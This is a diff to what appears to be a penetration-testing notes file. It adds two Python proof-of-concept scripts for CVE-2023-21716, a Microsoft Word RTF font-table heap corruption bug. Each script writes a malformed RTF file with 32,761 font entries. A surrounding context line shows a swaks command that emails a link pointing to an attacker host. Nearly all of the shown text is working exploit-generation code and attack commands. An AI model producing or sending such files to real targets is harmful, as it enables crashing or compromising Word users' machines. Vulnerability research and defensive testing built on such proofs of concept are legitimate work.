@@ -435,6 +435,38 @@ $ swaks --to <EMAIL> --from <EMAIL> --server <RHOST> --body "http://<LHOST>/"
 
 ## CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation)
 
+### PoC 1
+
+```c
+{% highlight Python %}
+#!/usr/bin/python
+#
+# PoC for:
+# Microsoft Word RTF Font Table Heap Corruption Vulnerability
+#
+# by Joshua J. Drake (@jduck)
+#
+
+import sys
+
+# allow overriding the number of fonts
+num = 32761
+if len(sys.argv) > 1:
+  num = int(sys.argv[1])
+
+f = open("tezt.rtf", "wb")
+f.write("{\\rtf1{\n{\\fonttbl")
+for i in range(num):
+  f.write("{\\f%dA;}\n" % i)
+f.write("}\n")
+f.write("{\\rtlch it didn't crash?? no calc?! BOO!!!}\n")
+f.write("}}\n")
+f.close()
+{% endhighlight %}
+```
+
+### PoC 2
+
 ```c
 open("t3zt.rtf","wb").write(("{\\rtf1{\n{\\fonttbl" + "".join([ ("{\\f%dA;}\n" % i) for i in range(0,32761) ]) + "}\n{\\rtlch no crash??}\n}}\n").encode('utf-8'))
 ```
